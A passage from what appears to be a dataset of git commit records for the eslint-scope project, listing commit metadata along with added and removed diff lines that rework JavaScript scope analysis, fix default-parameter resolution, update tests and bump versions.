 variableTargetScope.__define(<\n>+                pattern<c><\n>+                )<\n>+            );<\n>+            this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>+         * One of 'module'<c> 'block'<c> 'switch'<c> 'function'<c> 'catch'<c> 'with'<c> 'function'<c> 'class'<c> 'global'.<\n>+            this.__addDeclaredVariablesOfNode(variable<c> def.node);<\n>+            this.__addDeclaredVariablesOfNode(variable<c> def.parent);<\n>+        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>+        expect(scope.references).to.have.length(4);<\n>+        expect(scope.references[3].identifier.name).to.equal(""array"");<\n>+        expect(scope.references[3].isWrite()).to.be.false;<\n>+        expect(scope.references[3].resolved).to.be.null;<\n>+        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[0].from.type).to.equal(""for"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""array"");<\n>+        expect(scope.references).to.have.length(6);<\n>+        expect(scope.references[5].identifier.name).to.equal(""array"");<\n>+        expect(scope.references[5].isWrite()).to.be.false;<\n>+        expect(scope.references[5].resolved).to.be.null;<\n>+        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[0].from.type).to.equal(""for"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""e"");<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal(""array"");<\n>+        expect(scope.references).to.have.length(9);<\n>+        expect(scope.references[8].identifier.name).to.equal(""array"");<\n>+        expect(scope.references[8].isWrite()).to.be.false;<\n>+        expect(scope.references[8].resolved).to.be.null;<\n>+        expect(scopeManager.scopes).to.have.length(4);<\n>+        const iterScope = scope = scopeManager.scopes[2];<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].resolved).to.be.equal(scope.variables[0]);<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scopeManager.scopes).to.have.length(4);<\n>+        const iterScope = scope = scopeManager.scopes[2];<\n>+        expect(scope.references).to.have.length(4);<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[3].resolved).to.be.equal(scope.variables[0]);<\n>+        scope = scopeManager.scopes[3];<\n>","-    materializeTDZScope(node<c> iterationNode) {<\n>-        // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>-        // TDZ scope hides the declaration's names.<\n>-        this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>-        this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0<c> true);<\n>-    }<\n>-    materializeIterationScope(node) {<\n>-        // Generate iteration scope for upper ForIn/ForOf Statements.<\n>-        const letOrConstDecl = node.left;<\n>-        this.scopeManager.__nestForScope(node);<\n>-        this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>-        this.visitPattern(letOrConstDecl.declarations[0].id<c> pattern => {<\n>-            this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true<c> true);<\n>-        });<\n>-    }<\n>-        // FIXME: Maybe consider TDZ.<\n>-            this.materializeTDZScope(node.right<c> node);<\n>-            this.visit(node.right);<\n>-            this.close(node.right);<\n>-            this.materializeIterationScope(node);<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-            if (node.left.type === Syntax.VariableDeclaration) {<\n>-                this.visit(node.left);<\n>-                this.visitPattern(node.left.declarations[0].id<c> pattern => {<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true<c> true);<\n>-                });<\n>-            } else {<\n>-                this.visitPattern(node.left<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>-                    let maybeImplicitGlobal = null;<\n>-                    if (!this.currentScope().isStrict) {<\n>-                        maybeImplicitGlobal = {<\n>-                            pattern<c><\n>-                            node<\n>-                        };<\n>-                    }<\n>-                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal<c> false);<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true<c> false);<\n>-                });<\n>-            }<\n>-            this.visit(node.right);<\n>-            this.visit(node.body);<\n>-    visitVariableDeclaration(variableTargetScope<c> type<c> node<c> index<c> fromTDZ) {<\n>-        // If this was called to initialize a TDZ scope<c> this needs to make definitions<c> but doesn't make references.<\n>-        this.visitPattern(decl.id<c> { processRightHandNodes: !fromTDZ }<c> (pattern<c> info) => {<\n>-            variableTargetScope.__define(pattern<c><\n>-                ));<\n>-            if (!fromTDZ) {<\n>-                this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>-            }<\n>-const TDZScope = Scope.TDZScope;<\n>-            if (testScope.type === ""TDZ"") {<\n>-                return false;<\n>-            }<\n>-    __nestTDZScope(node) {<\n>-        return this.__nestScope(new TDZScope(this<c> this.__currentScope<c> node));<\n>-    }<\n>-         * One of 'TDZ'<c> 'module'<c> 'block'<c> 'switch'<c> 'function'<c> 'catch'<c> 'with'<c> 'function'<c> 'class'<c> 'global'.<\n>-            if (def.type !== Variable.TDZ) {<\n>-                this.__addDeclaredVariablesOfNode(variable<c> def.node);<\n>-                this.__addDeclaredVariablesOfNode(variable<c> def.parent);<\n>-            }<\n>-class TDZScope extends Scope {<\n>-    constructor(scopeManager<c> upperScope<c> block) {<\n>-        super(scopeManager<c> ""TDZ""<c> upperScope<c> block<c> false);<\n>-    }<\n>-    TDZScope<c><\n>-Variable.TDZ = ""TDZ"";<\n>-        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>-        expect(scope.type).to.equal(""TDZ"");<\n>-        expect(scope.variables).to.have.length(3);<\n>-        expect(scope.variables[0].name).to.equal(""a"");<\n>-        expect(scope.variables[1].name).to.equal(""b"");<\n>-        expect(scope.variables[2].name).to.equal(""c"");<\n>-        expect(scope.references).to.have.length(1);<\n>-        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>-        expect(scope.references[0].isWrite()).to.be.false;<\n>-        scope = scopeManager.scopes[3];<\n>-        expect(scope.references).to.have.length(3);<\n>-        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>-        expect(scope.implicit.left[0].from.type).to.equal(""TDZ"");<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal(""d"");<\n>-        expect(scope.type).to.equal(""TDZ"");<\n>-        expect(scope.variables).to.have.length(3);<\n>-        expect(scope.variables[0].name).to.equal(""a"");<\n>-        expect(scope.variables[1].name).to.equal(""b"");<\n>-        expect(scope.variables[2].name).to.equal(""c"");<\n>-        expect(scope.references).to.have.length(1);<\n>-        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>-        expect(scope.references[0].isWrite()).to.be.false;<\n>-        scope = scopeManager.scopes[3];<\n>-        expect(scope.references).to.have.length(5);<\n>-        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>-        expect(scope.implicit.left[0].from.type).to.equal(""TDZ"");<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal(""d"");<\n>-        expect(scope.implicit.left[2].identifier.name).to.equal(""e"");<\n>-        expect(scope.type).to.equal(""TDZ"");<\n>-        expect(scope.variables).to.have.length(3);<\n>-        expect(scope.variables[0].name).to.equal(""a"");<\n>-        expect(scope.variables[1].name).to.equal(""b"");<\n>-        expect(scope.variables[2].name).to.equal(""c"");<\n>-        expect(scope.references).to.have.length(1);<\n>-        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>-        expect(scope.references[0].isWrite()).to.be.false;<\n>-        scope = scopeManager.scopes[3];<\n>-        expect(scope.references).to.have.length(8);<\n>-        expect(scopeManager.scopes).to.have.length(5);<\n>-        let iterScope = scope = scopeManager.scopes[2];<\n>-        expect(scope.type).to.be.equal(""TDZ"");<\n>-        expect(scope.variables).to.have.length(1);<\n>-        expect(scope.variables[0].name).to.be.equal(""i"");<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal(""TDZ"");<\n>-        expect(scope.references).to.have.length(1);<\n>-        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>-        expect(scope.references[0].resolved).to.be.equal(scope.variables[0]);<\n>-        iterScope = scope = scopeManager.scopes[3];<\n>-        expect(scope.references).to.have.length(1);<\n>-        scope = scopeManager.scopes[4];<\n>-        expect(scopeManager.scopes).to.have.length(5);<\n>-        let iterScope = scope = scopeManager.scopes[2];<\n>-        expect(scope.type).to.be.equal(""TDZ"");<\n>-        expect(scope.variables).to.have.length(3);<\n>-        expect(scope.variables[0].name).to.be.equal(""i"");<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal(""TDZ"");<\n>-        expect(scope.variables[1].name).to.be.equal(""j"");<\n>-        expect(scope.variables[1].defs[0].type).to.be.equal(""TDZ"");<\n>-        expect(scope.variables[2].name).to.be.equal(""k"");<\n>-        expect(scope.variables[2].defs[0].type).to.be.equal(""TDZ"");<\n>-        expect(scope.references).to.have.length(1);<\n>-        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>-        expect(scope.references[0].resolved).to.be.equal(scope.variables[0]);<\n>-        iterScope = scope = scopeManager.scopes[3];<\n>-        expect(scope.references).to.have.length(3);<\n>-        scope = scopeManager.scopes[4];<\n>",F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Tue,15,55,21 Nov 2017,Fix: wrong resolution about default parameters (#33) * Fix: wrong resolution about default parameters * Chore: fix test failing [This code](https://github.com/eslint/eslint-scope/blob/57889f1b7f9602566f73f5ccbb5cd78a64fd8caa/tests/es6-destructuring-assignments.js#L571) is syntax error in ES2015. Its valid since ES2016.,0,0,3,159,7226,"+    // To override by function scopes.<\n>+    // References in default parameters isn't resolved to variables which are in their function body.<\n>+    __isValidResolution(ref<c> variable) { // eslint-disable-line class-methods-use-this<c> no-unused-vars<\n>+        return true;<\n>+    }<\n>+        if (!this.set.has(name)) {<\n>+            return false;<\n>+        }<\n>+        const variable = this.set.get(name);<\n>+        if (!this.__isValidResolution(ref<c> variable)) {<\n>+            return false;<\n>+        variable.references.push(ref);<\n>+        variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>+        if (ref.tainted) {<\n>+            variable.tainted = true;<\n>+            this.taints.set(variable.name<c> true);<\n>+        }<\n>+        ref.resolved = variable;<\n>+        return true;<\n>+    // References in default parameters isn't resolved to variables which are in their function body.<\n>+    //     const x = 1<\n>+    //     function f(a = x) { // This `x` is resolved to the `x` in the outer scope.<\n>+    //         const x = 2<\n>+    //         console.log(a)<\n>+    //     }<\n>+    __isValidResolution(ref<c> variable) {<\n>+        // If `options.nodejsScope` is true<c> `this.block` becomes a Program node.<\n>+        if (this.block.type === ""Program"") {<\n>+            return true;<\n>+        }<\n>+        const bodyStart = this.block.body.range[0];<\n>+        // It's invalid resolution in the following case:<\n>+        return !(<\n>+            variable.scope === this &&<\n>+            ref.identifier.range[0] < bodyStart &&                 // the reference is in the parameter part.<\n>+            variable.defs.every(d => d.name.range[0] >= bodyStart) // the variable is in the body.<\n>+        );<\n>+    }<\n>+    describe(""a default parameter creates a readable reference for references in right. It's resolved to outer scope's even if there is the variable in the function body:""<c> () => {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = a) { let a; }<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = a) { let a; }<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = a) => { let a; };<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            it(name<c> () => {<\n>+                const numVars = name === ""ArrowExpression"" ? 2 : 3;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b<c> a]<\n>+                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                const reference = scope.references[1];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+        }<\n>+    });<\n>+    describe(""a default parameter creates a readable reference for references in right. It's resolved to the parameter:""<c> () => {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = a<c> a) { }<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = a<c> a) { }<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = a<c> a) => { };<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            it(name<c> () => {<\n>+                const numVars = name === ""ArrowExpression"" ? 2 : 3;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b<c> a]<\n>+                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                const reference = scope.references[1];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scope.variables[scope.variables.length - 1]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+        }<\n>+    });<\n>+    describe(""a default parameter creates a readable reference for references in right (nested scope). It's resolved to outer scope's even if there is the variable in the function body:""<c> () => {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = function(){ a }) { let a; }<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = function(){ a }) { let a; }<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = function(){ a }) => { let a; };<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            it(name<c> () => {<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+                expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous function]<\n>+                const scope = scopeManager.scopes[2];<\n>+                expect(scope.references).to.have.length(1);  // [a]<\n>+                const reference = scope.references[0];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+        }<\n>+    });<\n>+const espree = require(""espree"");<\n>+        range: true<c><\n>+        ecmaVersion: 7<c><\n>+        sourceType<\n>","-        if (this.set.has(name)) {<\n>-            const variable = this.set.get(name);<\n>-            variable.references.push(ref);<\n>-            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>-            if (ref.tainted) {<\n>-                variable.tainted = true;<\n>-                this.taints.set(variable.name<c> true);<\n>-            }<\n>-            ref.resolved = variable;<\n>-            return true;<\n>-        return false;<\n>-var espree = require(""espree"");<\n>-        // enable es6 features.<\n>-        sourceType: sourceType<\n>",F
17,56,56,569,4,26,Gyandeep Singh,22,15,76,1,User,1,2117,Thu,11,48,13 Apr 2017,Docs: Remove extra header line from LICENSE (#32) Same stuff applies here from https://github.com/eslint/eslint/pull/8448,0,0,1,1,14,,-eslint-scope<\n>,F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Wed,17,3,12 Apr 2017,3.7.1,0,0,1,2,46,"+  ""version"": ""3.7.1""<c><\n>","-  ""version"": ""3.7.0""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Wed,17,3,12 Apr 2017,Build: changelog update for 3.7.1,0,0,1,3,204,+v3.7.1 - April 12<c> 2017<\n>+* ced6262 Fix: restore previous Scope API exports from escope (#31) (Vitor Balocco)<\n>+* 5c3d966 Fix: Remove and Modify tests that contain invalid ES6 syntax (#29) (Reyad Attiyat)<\n>,,F
17,56,56,569,4,26,Vitor Balocco <vitorbal@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,16,7,11 Apr 2017,Fix: restore previous Scope API exports from escope (#31),0,0,1,2,76,"+const Scope = require(""./scope"").Scope;<\n>","-const Scope = require(""./scope"");<\n>",F
17,56,56,569,4,26,Reyad Attiyat,34,5,15,15,User,0,2516,Mon,11,51,10 Apr 2017,Fix: Remove and Modify tests that contain invalid ES6 syntax (#29) Tests contained duplicate variable names and and parens around object destructuring have been fixed.,0,0,4,40,1664,"+        expect(scope.variables).to.have.length(1);<\n>+            ""e""<\n>+                } = object);<\n>+                } = object);<\n>+            ""let a; ({a} = {});""<c><\n>+            ""let a; ({b: a} = {});""<c><\n>+            ""let a; ({b: a = 0} = {});""<c><\n>","-    it(""let is materialized in ES6 block scope#2""<c> () => {<\n>-        const ast = espree(`<\n>-            {<\n>-                let i = 20;<\n>-                var i = 20;<\n>-                i;<\n>-            }<\n>-        `);<\n>-        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>-        expect(scopeManager.scopes).to.have.length(2);  // Program and BlcokStatement scope.<\n>-        let scope = scopeManager.scopes[0];<\n>-        expect(scope.type).to.be.equal(""global"");<\n>-        expect(scope.variables).to.have.length(1);  // No variable in Program scope.<\n>-        expect(scope.variables[0].name).to.be.equal(""i"");<\n>-        scope = scopeManager.scopes[1];<\n>-        expect(scope.type).to.be.equal(""block"");<\n>-        expect(scope.variables).to.have.length(1);  // `i` in block scope.<\n>-        expect(scope.variables[0].name).to.be.equal(""i"");<\n>-        expect(scope.references).to.have.length(3);<\n>-        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>-        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>-        expect(scope.references[2].identifier.name).to.be.equal(""i"");<\n>-    });<\n>-                let c = 30;<\n>-        expect(scope.variables).to.have.length(2);<\n>-            ""e""<c><\n>-            ""c""<\n>-            ""c""<c><\n>-                }) = object;<\n>-                }) = object;<\n>-            ""let a; ({a}) = {};""<c><\n>-            ""let a; ({b: a}) = {};""<c><\n>-            ""let a; ({b: a = 0}) = {};""<c><\n>",F
17,56,56,569,4,26,Ilya Volodin,7,3,46,0,User,1,2749,Fri,18,9,17 Mar 2017,3.7.0,0,0,1,2,46,"+  ""version"": ""3.7.0""<c><\n>","-  ""version"": ""3.6.0""<c><\n>",F
17,56,56,569,4,26,Ilya Volodin,7,3,46,0,User,1,2749,Fri,18,9,17 Mar 2017,Build: package.json and changelog update for 3.7.0,0,1,1,18,1281,"+v3.7.0 - March 17<c> 2017<\n>+* 9e27835 Chore: Add files section to package.json (#24) (Ilya Volodin)<\n>+* 3e4d123 Upgrade: eslint-config-eslint to 4.0.0 (#21) (Teddy Katz)<\n>+* 38c50fb Chore: Rename src to lib and test to tests (#20) (Corbin Uselton)<\n>+* f4cd920 Chore: Remove esprima (#19) (Corbin Uselton)<\n>+* f81fad5 Revert ""Chore: Remove esprima"" (#18) (James Henry)<\n>+* 31b0085 Chore: Remove es6-map and es6-weakmap as they are included in node4 (#10) (#13) (Corbin Uselton)<\n>+* 12a1ca1 Add Makefile.js and eslint (#15) (Reyad Attiyat)<\n>+* 7d23f8e Chore: Remove es6-map and es6-weakmap as they are included in node4 (#10) (Corbin Uselton)<\n>+* 019441e Chore: Convert to ES6 that is supported on Node 4<c> commonjs modules and remove Babel (#14) (Corbin Uselton)<\n>+* c647f65 Update: Add check for node.body in referencer (#2) (Corbin Uselton)<\n>+* eb5c9db Remove browserify and jsdoc (#12) (Corbin Uselton)<\n>+* cf38df0 Chore: Update README.md (#3) (James Henry)<\n>+* 8a142ca Chore: Add eslint-release scripts (#6) (James Henry)<\n>+* e60d8cb Chore: Remove unused bower.json (#5) (James Henry)<\n>+* 049c545 Chore: Fix tests for eslint-scope (#4) (James Henry)<\n>+* f026aab Chore: Update package.json for eslint fork (#1) (James Henry)<\n>+* a94d281 Chore: Update license with JSF copyright (Nicholas C. Zakas)<\n>",,F
17,56,56,569,4,26,Ilya Volodin,7,3,46,0,User,1,2749,Fri,18,9,17 Mar 2017,Chore: Add files section to package.json (#24),0,0,1,5,65,"+  ""files"": [<\n>+    ""LICENSE""<c><\n>+    ""README.md""<c><\n>+    ""lib""<\n>+  ]<c><\n>",,F
17,56,56,569,4,26,Teddy Katz,75,10,128,0,User,0,1599,Sat,18,35,11 Mar 2017,Upgrade: eslint-config-eslint to 4.0.0 (#21) This upgrades eslint-config-eslint to v4.0.0 and fixes all linting errors. Most of the errors were fixed by ESLints autofixer.,0,0,41,786,47719,"+    MOCHA = `${NODE_MODULES}mocha/bin/_mocha `<c><\n>+    let errors = 0<c><\n>+    let errors = 0;<\n>+    const lastReturn = exec(`${ISTANBUL} cover ${MOCHA} -- -R progress -c ${TEST_FILES}`);<\n>+     * @param  {Object}  dependency object containing the name and licenses of the given dependency<\n>+        const licenses = dependency.licenses;<\n>+            return licenses.some(license => isPermissible({<\n>+                name: dependency.name<c><\n>+                licenses: license<\n>+            }));<\n>+        return OPEN_SOURCE_LICENSES.some(license => license.test(licenses));<\n>+    }<c> deps => {<\n>+        const impermissible = Object.keys(deps).map(dependency => ({<\n>+            name: dependency<c><\n>+            licenses: deps[dependency].licenses<\n>+        })).filter(dependency => !isPermissible(dependency));<\n>+            impermissible.forEach(dependency => {<\n>+    for (const key in override) {<\n>+            const val = override[key];<\n>+    const options = updateDeeply(defaultOptions()<c> providedOptions);<\n>+    const scopeManager = new ScopeManager(options);<\n>+    const referencer = new Referencer(options<c> scopeManager);<\n>+        const nodeType = node.type;<\n>+        for (let i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+            const element = pattern.elements[i];<\n>+    const visitor = new PatternVisitor(options<c> rootPattern<c> callback);<\n>+        this.referencer.visitPattern(id<c> pattern => {<\n>+        const local = (node.local || node.id);<\n>+        const local = (node.local || node.id);<\n>+        const local = (node.local || node.id);<\n>+        const previous = this.isInnerMethodDefinition;<\n>+        const letOrConstDecl = node.left;<\n>+        this.visitPattern(letOrConstDecl.declarations[0].id<c> pattern => {<\n>+            options = { processRightHandNodes: false };<\n>+        let i<c> iz;<\n>+            this.visitPattern(node.params[i]<c> { processRightHandNodes: true }<c> visitPatternCallback);<\n>+            }<c> pattern => {<\n>+        let previous;<\n>+        const isMethodDefinition = node.type === Syntax.MethodDefinition;<\n>+                this.visitPattern(node.left.declarations[0].id<c> pattern => {<\n>+                this.visitPattern(node.left<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>+                    let maybeImplicitGlobal = null;<\n>+                            pattern<c><\n>+                            node<\n>+        const decl = node.declarations[index];<\n>+        const init = decl.init;<\n>+        this.visitPattern(decl.id<c> { processRightHandNodes: !fromTDZ }<c> (pattern<c> info) => {<\n>+                this.visitPattern(node.left<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>+                    let maybeImplicitGlobal = null;<\n>+                            pattern<c><\n>+                            node<\n>+        this.visitPattern(node.param<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>+    BreakStatement() {} // eslint-disable-line class-methods-use-this<\n>+    ContinueStatement() {} // eslint-disable-line class-methods-use-this<\n>+        const variableTargetScope = (node.kind === ""var"") ? this.currentScope().variableScope : this.currentScope();<\n>+        for (let i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>+            const decl = node.declarations[i];<\n>+        for (let i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>+        const importer = new Importer(node<c> this);<\n>+        const local = (node.id || node.local);<\n>+    MetaProperty() { // eslint-disable-line class-methods-use-this<\n>+        const scopes = this.__get(node);<\n>+            for (let i = scopes.length - 1; i >= 0; --i) {<\n>+                const scope = scopes[i];<\n>+            for (let i = 0<c> iz = scopes.length; i < iz; ++i) {<\n>+                const scope = scopes[i];<\n>+        const scopes = this.__get(node);<\n>+            const scope = scopes[0].upper;<\n>+    attach() { } // eslint-disable-line class-methods-use-this<\n>+    detach() { } // eslint-disable-line class-methods-use-this<\n>+    let body;<\n>+        for (let i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+            const stmt = body.body[i];<\n>+        for (let i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+            const stmt = body.body[i];<\n>+            const expr = stmt.expression;<\n>+    const scopes = scopeManager.__nodeToScope.get(scope.block);<\n>+        scopeManager.__nodeToScope.set(scope.block<c> [scope]);<\n>+        const name = ref.identifier.name;<\n>+        const variable = this.set.get(name);<\n>+        const defs = variable.defs;<\n>+        let closeRef;<\n>+            const ref = this.__left[i];<\n>+        const name = ref.identifier.name;<\n>+            const variable = this.set.get(name);<\n>+        let variables = this.__declaredVariables.get(node);<\n>+        let variable;<\n>+        const ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial<c> !!init);<\n>+        let current = this;<\n>+        let ref<c> i<c> iz;<\n>+    isArgumentsMaterialized() { // eslint-disable-line class-methods-use-this<\n>+    isThisMaterialized() { // eslint-disable-line class-methods-use-this<\n>+        for (let i = 0<c> iz = this.through.length; i < iz; ++i) {<\n>+        const implicit = [];<\n>+            const ref = this.__left[i];<\n>+            const info = implicit[i];<\n>+            const ref = this.__left[i];<\n>+        const variable = this.set.get(""arguments"");<\n>+    ""eslint-config-eslint"": ""^4.0.0""<c><\n>+describe(""arguments""<c> () => {<\n>+    it(""arguments are correctly materialized""<c> () => {<\n>+describe(""catch""<c> () => {<\n>+    it(""creates scope""<c> () => {<\n>+describe(""childVisitorKeys option""<c> () => {<\n>+    it(""should handle as a known node if the childVisitorKeys option was given.""<c> () => {<\n>+    it(""should not visit to properties which are not given.""<c> () => {<\n>+        const result = analyze(<\n>+    it(""should visit to given properties.""<c> () => {<\n>+        const result = analyze(<\n>+describe(""ES6 arrow function expression""<c> () => {<\n>+    it(""materialize scope for arrow function expression""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""generate bindings for parameters""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 block scope""<c> () => {<\n>+    it(""let is materialized in ES6 block scope#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""let is materialized in ES6 block scope#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""function delaration is materialized in ES6 block scope""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""let is not hoistable#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""let is not hoistable#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 catch""<c> () => {<\n>+    it(""takes binding pattern""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 class""<c> () => {<\n>+    it(""declaration name creates class scope""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""expression name creates class scope#1""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""expression name creates class scope#2""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""computed property key may refer variables""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""regression #49""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 default parameters:""<c> () => {<\n>+    describe(""a default parameter creates a writable reference for its initialization:""<c> () => {<\n>+            it(name<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""a default parameter creates a readable reference for references in right:""<c> () => {<\n>+            it(name<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""a default parameter creates a readable reference for references in right (for const):""<c> () => {<\n>+            it(name<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""a default parameter creates a readable reference for references in right (partial):""<c> () => {<\n>+            it(name<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    describe(""a default parameter creates a readable reference for references in right's nested scope:""<c> () => {<\n>+            it(name<c> () => {<\n>+                const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+describe(""ES6 destructuring assignments""<c> () => {<\n>+    it(""Pattern in var in ForInStatement""<c> () => {<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+    it(""Pattern in let in ForInStatement""<c> () => {<\n>+        const scopeManager = 